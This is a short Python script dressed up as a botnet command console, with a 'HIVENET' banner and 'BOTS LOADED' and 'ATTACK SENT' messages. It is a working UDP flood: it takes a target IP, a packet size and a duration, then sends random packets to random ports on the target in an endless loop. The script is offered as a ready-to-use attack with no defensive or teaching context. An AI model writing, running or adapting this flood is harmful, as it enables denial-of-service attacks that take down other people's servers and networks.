#UTF-8
#!/usr/bin/python 
#import requests
import socket
import random
import time
import sys
import os

ALL = True

HIVENET = True

os.system("clear")

if HIVENET:
	try:
		if ALL:
			def C2():
				print("\x1b[31m╔╗ ╔╗╔══╗╔╗  ╔╗╔═══╗╔═╗ ╔╗╔═══╗╔════╗")
				pass
				print("\x1b[31m║║ ║║╚╣╠╝║╚╗╔╝║║╔══╝║ ╚╗║║║╔══╝║╔╗╔╗║")
				pass
				print("\x1b[33m║╚═╝║ ║║ ╚╗║║╔╝║╚══╗║╔╗╚╝║║╚══╗╚╝║║╚╝")
				pass
				print("\x1b[33m║╔═╗║ ║║  ║╚╝║ ║╔══╝║║╚╗ ║║╔══╝  ║║")
				pass
				print("\x1b[32m║║ ║║╔╣╠╗ ╚╗╔╝ ║╚══╗║║ ║ ║║╚══╗ ╔╝╚╗")
				pass
				print("\x1b[32m╚╝ ╚╝╚══╝  ╚╝  ╚═══╝╚╝ ╚═╝╚═══╝ ╚══╝")
				pass
			C2()
		pass

		SLAM = True

		def UDP_SLAM():
			if SLAM:
				print("WELCOME TO THE HIVE") 
			if len(sys.argv) != 4:
			    print("\x1b[36mBOTS LOADED:1")   
			    sys.exit(1) 
			qIP = sys.argv[1]
			qPSize = int(sys.argv[2])
			qDuration = int(sys.argv[3])
			qClock = (lambda:0, time.clock)[qDuration > 0]
			qDuration = (1, (qClock() + qDuration))[qDuration > 0]
			qPacket = random._urandom(qPSize)
			qSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
			print("ATTACK SENT")
			while True:
			        if (qClock() < qDuration):
			                qPort = random.randint(1, 65535)
			                qSocket.sendto(qPacket, (qIP, qPort))
			        continue
		UDP_SLAM()
		pass
	except Exception:
		pass
